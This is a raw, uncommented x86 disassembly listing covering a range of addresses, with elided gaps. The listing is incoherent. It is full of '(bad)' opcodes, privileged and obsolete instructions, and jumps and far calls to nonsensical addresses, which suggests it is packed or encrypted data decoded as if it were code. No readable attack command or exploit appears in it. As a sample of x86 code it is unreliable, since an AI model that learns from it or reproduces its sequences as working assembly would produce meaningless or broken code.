  4292f0:	fdivr  QWORD PTR [edi+ebp*4+0x3da01590]
  4292f7:	jbe    0x42927e
  4292f9:	jo     0x429350
  4292fb:	mov    ecx,0x1c878704
  429300:	(bad)  
  429302:	popf   
  429303:	mov    dl,0x68
  429305:	mov    esi,0x20e69a0
  42930a:	cmp    ebp,ebp
  42930c:	popf   
  42930d:	pop    esi
  42930e:	iret   
  42930f:	xchg   esi,eax
  429310:	dec    edi
  429311:	sbb    al,0xa4
  429313:	arpl   WORD PTR [eax-0x4c587664],bp
  429319:	cmp    eax,0xf40d901d
  42931e:	ret    
  42931f:	out    0x4e,eax
  429321:	(bad)  
  429322:	(bad)  [esi-0x55fbcfbf]
  429328:	fcomp  QWORD PTR [ebp+0x14436959]
  42932e:	shl    BYTE PTR [ebx-0x6],1
  429331:	jno    0x4293a4
  429333:	adc    eax,0x2a41d46b
  429338:	and    ebx,DWORD PTR [esi]
  42933a:	inc    esp
  42933b:	aas    
  42933c:	push   0xffffffca
  42933e:	scas   eax,DWORD PTR es:[edi]
  42933f:	add    eax,0xf
	...
  4293b4:	push   cs
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	loop   0x429399
  4293c2:	mov    BYTE PTR [esi+0x39],cl
  4293c5:	mov    ch,0x1
  4293c7:	add    ch,dh
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    dl,ch
  4293cd:	jb     0x429364
  4293cf:	push   esp
  4293d0:	cld    
  4293d1:	mov    esi,?
  4293d3:	xor    dh,BYTE PTR [eax+esi*4-0x2a15ae6d]
  4293da:	mov    ds:0xd2949b3d,al
  4293df:	sbb    esi,ebx
  4293e1:	lds    esp,FWORD PTR [ecx+0xe]
  4293e4:	arpl   si,sp
  4293e6:	(bad)  
  4293e7:	fwait
  4293e8:	push   ds
  4293e9:	jl     0x4293d8
  4293eb:	std    
  4293ec:	mov    dl,0x5
  4293ee:	mov    ebp,0x46b9fe62
  4293f3:	sbb    DWORD PTR [esp+ebx*2],eax
  4293f6:	or     BYTE PTR [edi],cl
  4293f8:	push   ss
  4293f9:	pusha  
  4293fa:	sbb    al,0xf3
  4293fc:	sub    ecx,DWORD PTR [esp+edx*1]
  4293ff:	cmp    ch,BYTE PTR [edi+0x7fcd2d8e]
  429405:	aam    0xa9
  429407:	push   ebp
  429408:	fild   WORD PTR [edx+0x614a53d8]
  42940e:	repz sahf 
  429410:	adc    ebx,DWORD PTR [esp+esi*4]
  429413:	push   ebp
  429414:	xchg   esi,eax
  429415:	cld    
  429416:	(bad)  
  429417:	cmp    BYTE PTR [edi],bh
  429419:	outs   dx,BYTE PTR ds:[esi]
  42941a:	or     DWORD PTR [ebx],edx
  42941c:	cmp    eax,0xfeb22f1c
  429421:	cli    
  429422:	add    BYTE PTR [ecx-0x32445278],cl
  429428:	jge    0x42945c
  42942a:	outs   dx,DWORD PTR ds:[esi]
  42942b:	inc    eax
  42942c:	push   ebx
  42942d:	pop    esp
  42942e:	ret    
  42942f:	push   ds
  429430:	and    ebp,DWORD PTR [esi+0x5abff479]
  429436:	xor    eax,0xedc3827f
  42943b:	inc    esp
  42943c:	jne    0x429484
  42943e:	mov    al,0x40
  429440:	fwait
  429441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429442:	stos   BYTE PTR es:[edi],al
  429443:	adc    edx,DWORD PTR [edi]
  429445:	dec    ebp
  429446:	das    
  429447:	std    
  429448:	sbb    DWORD PTR ds:0x95a98cbf,0xffffffbf
  42944f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429450:	ds inc ebx
  429452:	jecxz  0x42946f
  429454:	fwait
  429455:	sbb    al,0xd7
  429457:	jo     0x4294a6
  429459:	push   eax
  42945a:	add    DWORD PTR [esi+0x5d],edi
  42945d:	push   ds
  42945e:	sar    ecx,cl
  429460:	adc    BYTE PTR [ebx+0x53],0xaa
  429464:	mov    ebx,0xcdb06e95
  429469:	push   eax
  42946a:	jg     0x4294de
  42946c:	cmp    esp,DWORD PTR [eax]
  42946e:	xor    al,0xa
  429470:	or     DWORD PTR [eax],eax
  429472:	sbb    eax,0x1b3c11e4
  429477:	push   ds
  429478:	sbb    al,0x35
  42947a:	sbb    eax,DWORD PTR [ebx+edx*2-0xaa1a009]
  429481:	icebp  
  429482:	mov    ch,0x60
  429484:	xchg   ecx,eax
  429485:	mov    WORD PTR [ebp-0x4a],cs
  429488:	add    eax,0x1c4c3198
  42948d:	mov    edi,DWORD PTR [ebp-0x35315247]
  429493:	jmp    0xe30c310d
  429498:	shl    BYTE PTR [ecx+0x1388daa],0x45
  42949f:	dec    eax
  4294a0:	sbb    esp,DWORD PTR [ebp-0x73]
  4294a3:	ins    DWORD PTR es:[edi],dx
  4294a4:	mov    edi,0x91894c3a
  4294a9:	cld    
  4294aa:	xchg   esi,eax
  4294ab:	xor    BYTE PTR [esi+0x5ab345af],ch
  4294b1:	xor    al,0x63
  4294b3:	jg     0x429524
  4294b5:	mov    edx,0x1d22cd08
  4294ba:	lods   al,BYTE PTR ds:[esi]
  4294bb:	mov    eax,ds:0xeeb152d5
  4294c0:	scas   eax,DWORD PTR es:[edi]
	...
  429531:	add    BYTE PTR [eax],al
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x30eac4f3
  429542:	outs   dx,DWORD PTR ds:[esi]
  429543:	(bad)  
  429544:	cs mov dh,0x1
  429547:	add    ch,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [ebx+0x21],al
  42954e:	out    dx,al
  42954f:	enter  0xa710,0x4f
  429553:	pop    edi
  429554:	pop    esp
  429555:	adc    eax,0x6f2c5c27
  42955a:	fadd   QWORD PTR [ebp+0x2e]
  42955d:	sub    BYTE PTR [edx-0x1af88c4],bl
  429563:	and    ebx,ebp
  429565:	mov    bh,BYTE PTR [edi+ebx*4]
  429568:	loope  0x429585
  42956a:	xor    al,0xe0
  42956c:	fcmove st,st(0)
  42956e:	mov    dl,0x8b
  429570:	add    eax,0xe934d8b7
  429575:	rcr    edi,cl
  429577:	rcl    BYTE PTR [esi+0x25],cl
  42957a:	mov    al,ds:0xd83e8ab
  42957f:	stos   DWORD PTR es:[edi],eax
  429580:	aam    0xac
  429582:	dec    eax
  429583:	add    esp,ecx
  429585:	or     BYTE PTR [edi+0x3e],bl
  429588:	and    al,0x3b
  42958a:	adc    BYTE PTR [ebx+ecx*1-0x77],bl
  42958e:	lea    esp,[ecx+esi*8]
  429591:	(bad)  
  429592:	cmp    al,0xe4
  429594:	jle    0x429552
  429596:	(bad)  
  429597:	lock je 0x429536
  42959a:	push   es
  42959b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42959c:	fist   WORD PTR [eax-0x6d622eb3]
  4295a2:	push   ds
  4295a3:	dec    si
  4295a5:	fstp   DWORD PTR [ecx-0xc58c4da]
  4295ab:	pop    edx
  4295ac:	inc    esp
  4295ad:	stos   BYTE PTR es:[edi],al
  4295ae:	mov    al,0x24
  4295b0:	ss inc edx
  4295b2:	sbb    al,0x1a
  4295b4:	mov    ds:0x7a1f8ed6,al
  4295b9:	push   0xffffffa8
  4295bb:	test   eax,0x93cf8e37
  4295c0:	loope  0x429634
  4295c2:	xchg   esi,eax
  4295c3:	fwait
  4295c4:	sub    al,0x92
  4295c6:	add    al,0x3f
  4295c8:	adc    bh,BYTE PTR [esi-0x3c]
  4295cb:	sahf   
  4295cc:	enter  0x1a40,0x8b
  4295d0:	push   es
  4295d1:	inc    edi
  4295d2:	inc    ebp
  4295d3:	mov    dl,al
  4295d5:	xchg   ebp,eax
  4295d6:	push   ebx
  4295d7:	pop    ecx
  4295d8:	jmp    0x429568
  4295da:	cmp    al,0x88
  4295dc:	pop    eax
  4295dd:	jle    0x4295fc
  4295df:	ds mov dh,0xb5
  4295e2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4295e4:	jbe    0x4295af
  4295e6:	hlt    
  4295e7:	dec    esp
  4295e8:	sbb    BYTE PTR [eax],ch
  4295ea:	call   0x8314a6f8
  4295ef:	add    edi,DWORD PTR [ebx+0x6b9e88a7]
  4295f5:	sub    eax,0x2401dac4
  4295fa:	call   0xc3a9:0x1af41e4e
  429601:	cmp    BYTE PTR [ecx+0x5b],ah
  429604:	xchg   ebx,eax
  429605:	jg     0x4295f3
  429607:	mov    al,0x75
  429609:	bound  ecx,QWORD PTR es:[edi-0x760517a]
  429610:	dec    BYTE PTR [ecx+0x4085965a]
  429616:	pop    esp
  429617:	stos   DWORD PTR es:[edi],eax
  429618:	outs   dx,BYTE PTR ds:[esi]
  429619:	jo     0x4295ef
  42961b:	sbb    BYTE PTR [esi+ebx*2-0x78ab683d],al
  429622:	xchg   DWORD PTR [eax+0x1c],esi
  429625:	or     DWORD PTR [esi-0x60d8a783],edx
  42962b:	jo     0x42966c
  42962d:	push   esp
  42962e:	mov    db0,edi
  429631:	retf   
  429632:	icebp  
  429633:	loop   0x429601
  429635:	jb     0x429616
  429637:	je     0x429661
  429639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42963a:	add    BYTE PTR ds:0x5aec1d59,dh
  429640:	sbb    eax,0x0
	...
  4296b1:	add    BYTE PTR [eax],al
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	je     0x42971d
  4296c2:	cwde   
  4296c3:	and    BYTE PTR [ebx],0xb7
  4296c6:	add    DWORD PTR [eax],eax
  4296c8:	cmc    
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    bl,al
  4296cd:	ins    BYTE PTR es:[edi],dx
  4296ce:	mov    bh,0x17
  4296d0:	aad    0x92
  4296d2:	xchg   DWORD PTR [eax],eax
  4296d4:	mov    ds:0xed285e7a,al
  4296d9:	iret   
  4296da:	jle    0x429714
  4296dc:	ins    BYTE PTR es:[edi],dx
  4296dd:	push   es
  4296de:	aad    0x80
  4296e0:	add    eax,0x607d1da9
  4296e5:	mov    esp,0x40e8fd3c
  4296ea:	and    BYTE PTR [edi+0x642705],dh
  4296f0:	dec    ecx
  4296f1:	bound  ecx,QWORD PTR ds:0xb53cd5c9
  4296f7:	xchg   edx,eax
  4296f8:	mov    BYTE PTR [edx-0x4b],dl
  4296fb:	fisubr DWORD PTR [ebp+0x2b]
  4296fe:	sbb    eax,0xf20b7437
  429703:	cmp    esp,edx
  429705:	cdq    
  429706:	push   cs
  429707:	ds xchg ebx,eax
  429709:	mov    dl,0x43
  42970b:	sub    al,BYTE PTR [edx+esi*4]
  42970e:	adc    esp,DWORD PTR [esp+eax*1]
  429711:	mov    ds:0x5715a975,eax
  429716:	ficomp WORD PTR [edx]
  429718:	lea    esp,[ecx+0x8]
  42971b:	cli    
  42971c:	jge    0x429721
  42971e:	mov    eax,0x16819753
  429723:	mov    dl,0xa5
  429725:	(bad)  
  429726:	push   esi
  429727:	xlat   BYTE PTR ds:[ebx]
  429728:	enter  0xf54a,0xc1
  42972c:	inc    ecx
  42972d:	outs   dx,DWORD PTR ds:[esi]
  42972e:	fcmovnb st,st(5)
  429730:	retf   0x459e
  429733:	fld    DWORD PTR [ebp+0x8]
  429736:	pop    ebp
  429737:	adc    bh,cl
  429739:	pop    esi
  42973a:	mov    WORD PTR [ecx],gs
  42973c:	jle    0x42975e
  42973e:	cmp    eax,ebp
  429740:	test   BYTE PTR [ebp+esi*1-0x3],ah
  429744:	inc    esp
  429745:	sub    eax,0xc65a5189
  42974a:	jle    0x4297b0
  42974c:	pop    ss
  42974d:	dec    ebx
  42974e:	leave  
  42974f:	or     al,0x6f
  429751:	pop    ss
  429752:	or     ch,0x3f
  429755:	call   0x8e36af28
  42975a:	mov    eax,0x82e0ce2c
  42975f:	imul   ecx,DWORD PTR [eax+0x99ca748],0xf
  429766:	xor    DWORD PTR [edi-0x2faec7f7],edx
  42976c:	push   ecx
  42976d:	call   0x45fd:0xbd9f4cb0
  429774:	scas   al,BYTE PTR es:[edi]
  429775:	cmp    al,bh
  429777:	popa   
  429778:	inc    edi
  429779:	iret   
  42977a:	and    al,dh
  42977c:	mov    esi,0x5b3fccf6
  429781:	mov    ds:0xc5435f3b,al
  429786:	or     DWORD PTR [edx+0x46],esi
  429789:	cdq    
  42978a:	xor    BYTE PTR [edi+0x51cd2d1e],ah
  429790:	adc    BYTE PTR [edx],al
  429792:	xchg   edx,eax
  429793:	imul   eax,DWORD PTR [ecx*2-0x5cf424e4],0x10
  42979b:	out    0xe8,al
  42979d:	mov    bl,0x68
  42979f:	fwait
  4297a0:	dec    ecx
  4297a1:	add    BYTE PTR [eax-0x7e5b2d63],0x4a
  4297a8:	aad    0x15
  4297aa:	mov    ds:0xa80ed626,eax
  4297af:	inc    ebx
  4297b0:	xchg   esi,eax
  4297b1:	aam    0x40
  4297b3:	push   esp
  4297b4:	aad    0x8e
  4297b6:	shl    DWORD PTR [edi+0x156f5462],cl
  4297bc:	push   cs
  4297bd:	and    al,0x53
  4297bf:	add    bh,BYTE PTR [ebx+0x0]
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [edi],ebx
  429841:	mov    DWORD PTR [edi+0x48],edx
  429844:	sbb    BYTE PTR [eax+0xf50001],bh
  42984a:	add    BYTE PTR [eax],al
  42984c:	fidiv  DWORD PTR [edi+0x67ce7512]
  429852:	mov    ebp,0x7811b2e4
  429857:	jg     0x4297e4
  429859:	adc    bl,ch
  42985b:	xor    eax,0xa453769a
  429861:	out    0x27,eax
  429863:	cmp    BYTE PTR [edx],dl
  429865:	lods   al,BYTE PTR ds:[esi]
  429866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429867:	(bad)  
  429868:	scas   eax,DWORD PTR es:[edi]
  429869:	cmc    
  42986a:	ror    DWORD PTR [edi+0x41b713e8],cl
  429870:	cmp    eax,0xe13a1557
  429875:	test   BYTE PTR [edi+0x39],0x58
  429879:	push   esp
  42987a:	popf   
  42987b:	bnd jmp 0x42988d
  42987e:	pop    ebx
  42987f:	cmp    eax,0x206d84e0
  429884:	mov    BYTE PTR [ebx-0x3f269b4d],ah
  42988a:	into   
  42988b:	pop    es
  42988c:	add    DWORD PTR [edx+0x63],ebx
  42988f:	nop
  429890:	in     al,dx
  429891:	fild   WORD PTR ss:[eax+0x20bbf488]
  429898:	sub    eax,0x8f3997b3
  42989d:	inc    esp
  42989e:	(bad)  
  42989f:	mov    esp,0x51593a7d
  4298a4:	daa    
  4298a5:	xchg   edx,eax
  4298a6:	and    ah,ch
  4298a8:	cld    
  4298a9:	loope  0x429847
  4298ab:	add    DWORD PTR ds:0xa2cca80a,edx
  4298b1:	cmp    eax,0x221a8bad
  4298b6:	sub    ch,BYTE PTR [ecx]
  4298b8:	stos   BYTE PTR es:[edi],al
  4298b9:	jmp    0x7b4c:0x8df9246a
  4298c0:	sub    BYTE PTR [eax+ebx*2],ch
  4298c3:	dec    esp
  4298c4:	pop    ebx
  4298c5:	mov    ss,WORD PTR [ecx]
  4298c7:	repz jns 0x429930
  4298ca:	mov    bh,0x68
  4298cc:	fistp  WORD PTR [ebx+0x14]
  4298cf:	xor    al,dh
  4298d1:	into   
  4298d2:	pop    edx
  4298d3:	push   edx
  4298d4:	mov    esi,0x184fbe26
  4298d9:	ds (bad) 
  4298db:	sub    al,0x3e
  4298dd:	jg     0x4298a6
  4298df:	mov    dl,0xb8
  4298e1:	sti    
  4298e2:	test   eax,0x6aa75eed
  4298e7:	xchg   ebx,eax
  4298e8:	cmp    eax,0x4f590386
  4298ed:	dec    esp
  4298ee:	adc    al,0x93
  4298f0:	(bad)  
  4298f1:	adc    BYTE PTR [ebp+0x67042711],ah
  4298f7:	pushf  
  4298f8:	stos   BYTE PTR es:[edi],al
  4298f9:	or     dl,dh
  4298fb:	jno    0x4298c0
  4298fd:	xor    dl,BYTE PTR [ebx]
  4298ff:	jle    0x42995e
  429901:	cmp    ch,BYTE PTR [esi]
  429903:	mov    ebp,0xc044d612
  429908:	cmp    ebp,DWORD PTR [edx]
  42990a:	test   al,0x9f
  42990c:	cli    
  42990d:	add    eax,0xd4b70be5
  429912:	pusha  
  429913:	pop    ecx
  429914:	sub    BYTE PTR [ecx*1+0x44a6596e],dl
  42991b:	jb     0x429973
  42991d:	sbb    eax,0xbed4a6
  429922:	dec    edx
  429923:	sub    BYTE PTR [edi+edx*4],ch
  429926:	xchg   ecx,eax
  429927:	xor    BYTE PTR [edi],ah
  429929:	cmc    
  42992a:	and    bl,BYTE PTR [esi+0x36]
  42992d:	cmp    ch,cl
  42992f:	cmp    eax,0x98a916ae
  429934:	shl    ch,1
  429936:	mov    cl,0xaa
  429938:	lock mov ebx,0xd6b8c002
  42993f:	ret    
  429940:	cwde   
	...
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [esi+ebx*2+0xa],edi
  4299c3:	mov    eax,ds:0x1b90d
  4299c8:	cmc    
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    dl,ch
  4299cd:	in     al,dx
  4299ce:	or     cl,BYTE PTR [edx]
  4299d0:	cs jb  0x4299f0
  4299d3:	test   bh,al
  4299d5:	dec    edx
  4299d6:	fwait
  4299d7:	ret    
  4299d8:	inc    esp
  4299d9:	mov    ebx,0xe8db2559
  4299de:	push   edi
  4299df:	pop    esp
  4299e0:	mov    edi,0xd87aab8c
  4299e5:	stos   DWORD PTR es:[edi],eax
  4299e6:	outs   dx,DWORD PTR ds:[esi]
  4299e7:	rol    BYTE PTR [eax+0x2a],0xf6
  4299eb:	fidiv  DWORD PTR [eax]
  4299ed:	(bad)  
  4299ee:	je     0x429a0c
  4299f0:	push   cs
  4299f1:	aam    0xd7
  4299f3:	add    BYTE PTR [edi],dh
  4299f5:	dec    ebp
  4299f6:	mov    ch,0x84
  4299f8:	sub    al,0xe0
  4299fa:	popf   
  4299fb:	and    edi,DWORD PTR [esi]
  4299fd:	imul   esi,ebx,0xffffffd7
  429a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a01:	iret   
  429a02:	or     eax,0xff7b3bd3
  429a07:	or     bl,bl
  429a09:	ficomp WORD PTR [esi-0x68]
  429a0c:	inc    ebx
  429a0d:	push   ecx
  429a0e:	pop    esp
  429a0f:	mov    ah,dl
  429a11:	pop    edi
  429a12:	xor    al,BYTE PTR [eax+0x4b3ee24b]
  429a18:	mov    ebp,0xe91ac04c
  429a1d:	pop    edi
  429a1e:	mov    ebx,0x7cbaa18e
  429a23:	js     0x429a92
  429a25:	pop    ds
  429a26:	jne    0x4299b0
  429a28:	lods   al,BYTE PTR ds:[esi]
  429a29:	add    DWORD PTR [edx-0x1b],0xffffffe4
  429a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a2e:	mov    ebx,DWORD PTR [esi]
  429a30:	mov    eax,ds:0xa1248034
  429a35:	pop    ss
  429a36:	in     eax,dx
  429a37:	lea    eax,[ecx]
  429a39:	(bad)  
  429a3a:	push   edx
  429a3b:	jbe    0x429a5f
  429a3d:	outs   dx,BYTE PTR ds:[esi]
  429a3e:	into   
  429a3f:	jmp    DWORD PTR [ecx+0x57]
  429a42:	jb     0x429a71
  429a44:	add    dh,dl
  429a46:	adc    eax,0x50996dac
  429a4b:	ins    BYTE PTR es:[edi],dx
  429a4c:	jge    0x429a9f
  429a4e:	scas   eax,DWORD PTR es:[edi]
  429a4f:	out    0x40,eax
  429a51:	cmp    al,0xd2
  429a53:	(bad)
  429a56:	push   cs
  429a57:	(bad)  
  429a58:	out    0x5a,eax
  429a5a:	mov    esp,0xb3e0cde8
  429a60:	nop
  429a61:	retf   
  429a62:	adc    DWORD PTR [eax-0x38bdf4d9],ebx
  429a68:	or     eax,0xa94ff4ef
  429a6d:	in     al,dx
  429a6e:	shl    bl,cl
  429a70:	push   ecx
  429a71:	or     ecx,DWORD PTR [edx+0x1149b1d6]
  429a77:	pop    DWORD PTR [edi]
  429a79:	jg     0x429a88
  429a7b:	sub    BYTE PTR [ebx-0x25],0xad
  429a7f:	mov    esp,0x299e068c
  429a84:	pop    ebp
  429a85:	fs inc ebx
  429a87:	xor    DWORD PTR ds:0x3184d5e9,0xfffffff5
  429a8e:	pop    ds
  429a8f:	sub    BYTE PTR [ebx+eax*8],dl
  429a92:	pushf  
  429a93:	xor    DWORD PTR [edi-0x5b7e36d3],edx
  429a99:	mov    edx,0xa5ee8536
  429a9e:	inc    ebp
  429a9f:	and    al,0x21
  429aa1:	iret   
  429aa2:	cmp    DWORD PTR [edx],ecx
  429aa4:	inc    ch
  429aa6:	push   cs
  429aa7:	inc    edi
  429aa8:	iret   
  429aa9:	aad    0x9f
  429aab:	pop    ebx
  429aac:	iret   
  429aad:	jge    0x429a6a
  429aaf:	stos   DWORD PTR es:[edi],eax
  429ab0:	(bad)  
  429ab1:	sub    al,0x31
  429ab3:	fdiv   DWORD PTR [edx]
  429ab5:	cli    
  429ab6:	in     eax,dx
  429ab7:	imul   esi,DWORD PTR [ecx],0xffffffbc
  429aba:	sti    
  429abb:	fidivr WORD PTR [eax+0x71]
  429abe:	mov    dl,0x41
  429ac0:	sbb    eax,DWORD PTR [eax]
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x5b57
  429b42:	gs enter 0xba02,0x1
  429b47:	add    ch,dh
  429b49:	add    BYTE PTR [eax],al
  429b4b:	add    BYTE PTR ds:0x158cfae5,dh
  429b51:	mov    dh,0xa5
  429b53:	dec    DWORD PTR [ebp+0x3cdf8147]
  429b59:	cmp    dh,bl
  429b5b:	mov    bl,cl
  429b5d:	dec    edi
  429b5e:	cmp    DWORD PTR [edi+edx*4+0x7a0b9099],0x68b0ba6a
  429b69:	jecxz  0x429af2
  429b6b:	pop    ebx
  429b6c:	out    0xa1,al
  429b6e:	ins    BYTE PTR es:[edi],dx
  429b6f:	loopne 0x429b56
  429b71:	push   edx
  429b72:	push   es
  429b73:	mov    ch,0xa2
  429b75:	mov    DWORD PTR [esi+0x52],esp
  429b78:	adc    ch,BYTE PTR [edi]
  429b7a:	js     0x429bf3
  429b7c:	sbb    ch,bh
  429b7e:	aas    
  429b7f:	loope  0x429b39
  429b81:	or     BYTE PTR [ecx+0x8f5b86b],cl
  429b87:	dec    BYTE PTR [eax+eiz*4-0x60]
  429b8b:	mov    WORD PTR [ecx-0x7ea81bbb],?
  429b91:	int3   
  429b92:	jge    0x429c09
  429b94:	xchg   esp,eax
  429b95:	(bad)  
  429b97:	xor    BYTE PTR [eax+0xc741e09],bh
  429b9d:	sub    cl,BYTE PTR [ebx]
  429b9f:	inc    ecx
  429ba0:	nop
  429ba1:	inc    esi
  429ba2:	mov    dl,0xfc
  429ba4:	std    
  429ba5:	in     eax,0x4f
  429ba7:	pop    es
  429ba8:	mov    bl,BYTE PTR [edx]
  429baa:	dec    edi
  429bab:	(bad)  
  429bac:	cdq    
  429bad:	sub    BYTE PTR [eax+edx*2+0x39],0x91
  429bb2:	(bad)  
  429bb3:	pop    ds
  429bb4:	aas    
  429bb5:	lods   eax,DWORD PTR fs:[esi]
  429bb7:	xlat   BYTE PTR ds:[ebx]
  429bb8:	pop    esp
  429bb9:	push   ebx
  429bba:	pop    ebp
  429bbb:	push   eax
  429bbc:	xchg   esp,eax
  429bbd:	js     0x429baa
  429bbf:	mov    edi,0x4743c079
  429bc4:	jp     0x429b61
  429bc6:	add    edi,ebx
  429bc8:	test   eax,0xe4b104b6
  429bcd:	xor    al,BYTE PTR [ebx]
  429bcf:	retf   
  429bd0:	test   DWORD PTR [edx],esi
  429bd2:	aaa    
  429bd3:	outs   dx,BYTE PTR ds:[esi]
  429bd4:	test   al,0x85
  429bd6:	jb     0x429bd5
  429bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bd9:	or     eax,0xe8bc3ee4
  429bde:	shl    DWORD PTR [eax],0xbe
  429be1:	shl    DWORD PTR [edi],cl
  429be3:	mov    WORD PTR [edx-0xa3b6472],?
  429be9:	mov    sp,0x2e4b
  429bed:	fxch   st(5)
  429bef:	xchg   bh,ch
  429bf1:	(bad)  
  429bf4:	xchg   edx,eax
  429bf5:	and    ah,dl
  429bf7:	adc    DWORD PTR [edx],ebp
  429bf9:	imul   ecx,DWORD PTR [edx+eax*2-0x30],0xffffffba
  429bfe:	jbe    0x429bde
  429c00:	cwde   
  429c01:	ins    BYTE PTR es:[edi],dx
  429c02:	and    eax,0xbb11d1ee
  429c07:	retf   0xf6d8
  429c0a:	mov    eax,ds:0xf867c235
  429c0f:	iret   
  429c10:	mov    bp,0x1b0e
  429c14:	inc    eax
  429c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c16:	nop
  429c17:	xor    esp,DWORD PTR [ebx]
  429c19:	fwait
  429c1a:	dec    esp
  429c1b:	mov    al,ds:0x5e5379e2
  429c20:	and    DWORD PTR [ecx],esp
  429c22:	(bad)  
  429c23:	jnp    0x429c0e
  429c25:	add    DWORD PTR [edx*4-0x7b4b68b7],esi
  429c2c:	retf   
  429c2d:	cwde   
  429c2e:	and    al,BYTE PTR fs:[esi-0xa9afc56]
  429c35:	jns    0x429be5
  429c37:	in     eax,dx
  429c38:	adc    DWORD PTR [esi+0x6151b4bf],esp
  429c3e:	popa   
  429c3f:	div    BYTE PTR [ecx+0x0]
	...
  429cb1:	add    BYTE PTR [eax],al
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	push   ss
  429cc1:	(bad)  
  429cc2:	(bad)  
  429cc3:	mov    bh,dh
  429cc5:	mov    edx,0xf50001
  429cca:	add    BYTE PTR [eax],al
  429ccc:	test   DWORD PTR ds:[bp-0xc],esp
  429cd1:	dec    ebx
  429cd2:	dec    esp
  429cd3:	mov    eax,?
  429cd5:	jns    0x429c71
  429cd7:	js     0x429d03
  429cd9:	cmc    
  429cda:	jp     0x429cd7
  429cdc:	jo     0x429d4b
  429cde:	adc    edx,DWORD PTR ds:0xdc6249e3
  429ce4:	arpl   WORD PTR [eax-0xd711750],bx
  429cea:	sub    ch,cl
  429cec:	icebp  
  429ced:	mov    DWORD PTR [ecx+0x14],0x9fc5a7a
  429cf4:	hlt    
  429cf5:	push   0x3e
  429cf7:	repz push edi
  429cf9:	jnp    0x429cab
  429cfb:	sbb    BYTE PTR [ebx+edi*2-0x5226c997],bh
  429d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d03:	xchg   ecx,eax
  429d04:	neg    DWORD PTR ds:0x362bf818
  429d0a:	and    BYTE PTR [ecx+eax*1],dl
  429d0d:	pop    eax
  429d0e:	pop    edx
  429d0f:	push   eax
  429d10:	mov    edx,0xd43e46f6
  429d15:	neg    BYTE PTR [edx+eiz*8]
  429d18:	inc    edi
  429d19:	xlat   BYTE PTR ds:[ebx]
  429d1a:	push   edi
  429d1b:	into   
  429d1c:	aas    
  429d1d:	ins    BYTE PTR es:[edi],dx
  429d1e:	loopne 0x429d2e
  429d20:	jmp    0xb7b0:0xb9e0a67d
  429d27:	lahf   
  429d28:	adc    ch,BYTE PTR ds:0xed641264
  429d2e:	sbb    ch,BYTE PTR [ecx+0x5df392ef]
  429d34:	push   edx
  429d35:	mov    eax,0xd8fa0f1a
  429d3a:	ds jle 0x429ccc
  429d3d:	or     DWORD PTR [ecx-0xa2e7b5a],esi
  429d43:	in     eax,dx
  429d44:	xor    DWORD PTR [esi],esi
  429d46:	imul   eax,ebx,0x2b679343
  429d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d4d:	mov    edi,0xea74e4c2
  429d52:	scas   al,BYTE PTR es:[edi]
  429d53:	stos   BYTE PTR es:[edi],al
  429d54:	xor    DWORD PTR [edi+0x2fdd2960],edx
  429d5a:	scas   al,BYTE PTR es:[edi]
  429d5b:	fld    TBYTE PTR [ecx-0x77]
  429d5e:	xor    DWORD PTR [eax-0x15997d51],esi
  429d64:	mov    ch,cl
  429d66:	jg     0x429cfe
  429d68:	cmp    eax,0x7e774335
  429d6d:	xlat   BYTE PTR ds:[ebx]
  429d6e:	sbb    ebp,esp
  429d70:	int    0x62
  429d72:	hlt    
  429d73:	int    0x5
  429d75:	sbb    al,BYTE PTR [eax+0x6bdbc723]
  429d7b:	cmp    BYTE PTR [ebp+0x7c],dh
  429d7e:	mov    WORD PTR [edx-0x3a],cs
  429d81:	push   esp
  429d82:	cwde   
  429d83:	jnp    0x429d47
  429d85:	push   ecx
  429d86:	in     eax,0x51
  429d88:	imul   esp,esi,0x4935284f
  429d8e:	xchg   edi,eax
  429d8f:	dec    ebp
